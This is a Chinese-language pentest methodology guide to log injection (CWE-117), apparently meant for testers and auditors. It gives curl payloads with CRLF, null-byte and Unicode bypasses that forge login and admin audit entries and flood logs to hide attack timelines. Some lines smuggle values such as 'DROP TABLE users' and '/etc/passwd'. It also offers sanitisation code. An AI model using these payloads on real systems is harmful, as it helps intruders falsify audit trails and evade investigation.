# 日志注入检测 (Log Injection Detection)

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供日志注入漏洞检测的系统化方法论，帮助测试人员发现和应用日志注入攻击技术。

### 1.2 适用范围
本文档适用于以下场景：
- Web 应用日志注入测试
- 日志伪造攻击评估
- 日志完整性验证
- 审计系统抗注入能力测试

### 1.3 读者对象
- 渗透测试工程师
- 安全审计人员
- 应用安全分析师
- 安全开发人员

---

## 第二部分：核心渗透技术专题

### 2.1 技术介绍

日志注入（Log Injection）是指攻击者通过将特殊字符（如换行符、空字节等）注入到应用程序的日志中，从而伪造日志条目、破坏日志完整性或误导调查的攻击技术。

**核心原理：**
- **CRLF 注入**：利用换行符（\r\n）注入虚假日志条目
- **空字节注入**：利用空字节（\x00）截断日志
- **时间戳伪造**：注入包含时间戳的虚假日志
- **日志截断**：通过特殊字符截断日志记录

### 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **用户输入记录** | 搜索、评论、表单 | 输入直接记录到日志 |
| **HTTP 头记录** | User-Agent、Referer | 头部值可被控制 |
| **URL 参数** | 查询字符串 | 参数值被记录 |
| **Cookie 值** | Session、跟踪 Cookie | Cookie 值被记录 |
| **文件上传** | 文件名、元数据 | 文件信息被记录 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**基础 CRLF 注入测试：**
```bash
# 测试换行符注入
curl "http://target/search?q=test%0d%0a2024-01-01%20INFO%20Fake%20Log%20Entry"

# 测试仅 LF
curl "http://target/search?q=test%0a2024-01-01%20INFO%20Fake%20Log%20Entry"

# 测试仅 CR
curl "http://target/search?q=test%0d2024-01-01%20INFO%20Fake%20Log%20Entry"

# 检查响应或日志系统是否包含注入的日志条目
```

**HTTP 头注入测试：**
```bash
# User-Agent 注入
curl -H "User-Agent: Mozilla/5.0%0d%0a2024-01-01 INFO Fake Entry" \
     "http://target/"

# Referer 注入
curl -H "Referer: http://evil.com%0d%0a2024-01-01 INFO Fake Entry" \
     "http://target/"

# X-Forwarded-For 注入
curl -H "X-Forwarded-For: 127.0.0.1%0d%0a2024-01-01 INFO Fake Entry" \
     "http://target/"

# Cookie 注入
curl -H "Cookie: session=abc%0d%0a2024-01-01 INFO Fake Entry" \
     "http://target/"
```

**空字节注入测试：**
```bash
# 测试空字节截断
curl "http://target/search?q=test%00injected"

# 测试日志截断效果
# 某些日志系统遇到空字节会停止记录
curl "http://target/api/data?id=1%00DROP TABLE users"
```

#### 2.3.2 白盒测试

**代码审计要点：**
```java
// 危险模式：直接记录用户输入
logger.info("User search: " + userInput);

// 危险模式：记录 HTTP 头
logger.info("User-Agent: " + request.getHeader("User-Agent"));

// 危险模式：记录 Cookie
logger.info("Session: " + request.getCookie("session").getValue());

// 正确模式：过滤后记录
logger.info("User search: {}", sanitize(userInput));

// 正确模式：使用结构化日志
logger.info("User search: {}", userInput.replaceAll("[\\r\\n]", ""));
```

**日志配置审计：**
```xml
<!-- 检查日志格式配置 -->
<PatternLayout pattern="%d %p %c - %m%n"/>
<!-- 如果 %m (消息) 包含用户输入且未过滤，存在风险 -->

<!-- 检查是否有输入过滤配置 -->
<replace regex="[\r\n]" replacement=""/>
```

### 2.4 漏洞利用方法

#### 2.4.1 日志伪造攻击

```bash
# 伪造成功登录日志
curl "http://target/login?user=admin%0d%0a2024-01-01%2012:00:00%20INFO%20Login%20successful%20for%20admin%20from%20127.0.0.1"

# 伪造管理员操作
curl "http://target/api?action=%0d%0a2024-01-01%2012:00:00%20INFO%20Admin%20user%20created%20by%20system"

# 注入虚假审计记录
curl "http://target/audit?event=%0d%0a2024-01-01%2012:00:00%20AUDIT%20Security%20scan%20completed%20-%20No%20issues%20found"
```

#### 2.4.2 日志混淆攻击

```bash
# 注入大量虚假日志混淆调查
for i in {1..100}; do
    curl "http://target/api?msg=%0d%0a2024-01-01%2012:00:$i%20INFO%20System%20check%20$i"
done

# 使调查人员难以确定真实攻击时间线
```

#### 2.4.3 日志截断攻击

```bash
# 使用空字节截断日志
curl "http://target/api/sensitive?data=secret%00TRUNCATED"
# 日志可能只记录到空字节处

# 使用特殊字符截断
curl "http://target/api/exec?cmd=cat%00/etc/passwd"
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过输入过滤

```bash
# 如果过滤 \r\n
# 使用 Unicode 变体
curl "http://target/search?q=test\u2028Fake Entry"  # 行分隔符
curl "http://target/search?q=test\u2029Fake Entry"  # 段落分隔符

# 使用编码绕过
curl "http://target/search?q=test%u000d%u000aFake Entry"

# 使用 HTML 实体（如果日志输出到 HTML）
curl "http://target/search?q=test&#13;&#10;Fake Entry"
```

#### 2.5.2 绕过日志脱敏

```bash
# 如果系统脱敏特定字段
# 尝试嵌套注入
curl "http://target/api?user[admin]=test%0d%0aFake Entry"

# 尝试 JSON 注入
curl "http://target/api?data={\"user\":\"test%0d%0aFake Entry\"}"
```

---

## 第三部分：附录

### 3.1 日志注入检测清单

| **测试点** | **测试 Payload** | **预期结果** | **状态** |
| :--- | :--- | :--- | :--- |
| URL 参数 | `?q=test%0d%0aFake` | 日志被注入 | ☐ |
| HTTP 头 | `User-Agent: test%0d%0a` | 日志被注入 | ☐ |
| Cookie | `Cookie: s=test%0d%0a` | 日志被注入 | ☐ |
| POST 数据 | `msg=test%0d%0a` | 日志被注入 | ☐ |
| 文件上传 | 文件名含%0d%0a | 日志被注入 | ☐ |
| API JSON | `{"msg":"test%0d%0a"}` | 日志被注入 | ☐ |

### 3.2 日志注入防护建议

```java
// 输入验证
public String sanitize(String input) {
    if (input == null) return "";
    // 移除换行符和特殊字符
    return input.replaceAll("[\\r\\n\\t]", "")
                .replaceAll("\\x00", "")
                .trim();
}

// 使用结构化日志
logger.info("User search", 
    kv("user", user), 
    kv("query", sanitize(query)));

// 日志输出编码
public String encodeForLog(String input) {
    return input.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r");
}
```

### 3.3 参考资源

- [CWE-117: Improper Output Neutralization for Logs](https://cwe.mitre.org/data/definitions/117.html)
- [OWASP Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
- [PCI DSS Logging Requirements](https://docs-prv.pcisecuritystandards.org/PCI%20DSS/Standard/PCI-DSS-v4_0.pdf)
